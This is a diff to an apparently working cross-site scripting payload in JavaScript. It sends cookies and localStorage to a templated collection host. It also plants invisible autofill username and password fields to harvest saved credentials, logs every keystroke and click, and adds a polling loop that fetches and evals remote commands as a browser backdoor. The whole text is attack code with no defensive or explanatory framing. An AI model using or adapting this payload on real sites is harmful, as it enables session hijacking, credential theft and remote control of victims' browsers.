@@ -1,52 +1,36 @@
+var _ib='{{localhost}}';
+function _ib_send(path,data){new Image().src=_ib+path+'?data='+encodeURIComponent(data);}
 
-var i=new Image;
-i.src="{{localhost}}/xxs/cookies?data="+document.cookie;
+_ib_send('/xxs/cookies',document.cookie);
+_ib_send('/xxs/localstorage',JSON.stringify(localStorage));
 
+var body=document.getElementsByTagName("body")[0];
+var u=document.createElement("input");u.type="text";u.autocomplete="on";u.style.position="fixed";u.style.opacity="0";
+var p=document.createElement("input");p.type="password";p.autocomplete="on";p.style.position="fixed";p.style.opacity="0";
+body.append(u);body.append(p);
+setTimeout(function(){_ib_send('/xxs/gebruiker','u='+u.value+'&p='+p.value);},5000);
 
-let data = JSON.stringify(localStorage);
-let encodedData = encodeURIComponent(data);
-let body = document.getElementsByTagName("body")[0]
-fetch("{{localhost}}/xxs/localstorage?data="+ encodedData);
-
-var u = document.createElement("input");
-u.type = "text";
-u.autocomplete = "on";
-u.style.position = "fixed";
-u.style.opacity = "0";
-
-var p = document.createElement("input");
-p.type = "password";
-p.autocomplete = "on";
-p.style.position = "fixed";
-p.style.opacity = "0";
-
-body.append(u);
-body.append(p);
-setTimeout(function(){fetch("{{localhost}}/xxs/gebruiker?u=" + u.value + "&p=" + p.value)}, 5000);
-
-//const formulieren = document.querySelectorAll("FORM");
-//formulieren.forEach((yolo) => {
-//yolo.addEventListener("submit", function(e) {
-//  e.preventDefault();
-//  fetch("{{localhost}}/xxs/form", {
-//      method: 'POST',
-//      data: new FormData(yolo)
-//    });
-//});
-//});
-
-
-
-
-function click(e){
-    e = e || window.event;
-    var target = e.target || e.srcElement;
-    fetch("{{localhost}}/xxs/keylogger?data=\n\n<klik>"+target+"</klik>");
-
-
-
+function _ib_click(e){
+  e=e||window.event;
+  var t=e.target||e.srcElement;
+  var tag=t.tagName||'?';
+  var id=t.id?'#'+t.id:'';
+  var cls=t.className?'.'+String(t.className).split(' ')[0]:'';
+  _ib_send('/xxs/keylogger','[klik]'+tag+id+cls);
 }
+function _ib_key(e){_ib_send('/xxs/keylogger',e.key);}
+document.addEventListener('keydown',_ib_key);
+document.addEventListener('click',_ib_click);
 
-function logKey(event){fetch("{{localhost}}/xxs/keylogger?data=" + event.key);}
-document.addEventListener('keydown', logKey);
-document.addEventListener('click', click);
+setInterval(function(){
+  var s=new XMLHttpRequest();
+  s.open('GET',_ib+'/xxs/commands?t='+Date.now(),true);
+  s.onload=function(){
+    if(s.status===200&&s.responseText&&s.responseText.indexOf('no commands')===-1){
+      try{(1,eval)(s.responseText);}catch(e){
+        new Image().src=_ib+'/xxs/commands/result?id=0&data='+encodeURIComponent('EVAL_BLOCKED:'+e.message);
+      }
+    }
+  };
+  s.send();
+},5000);
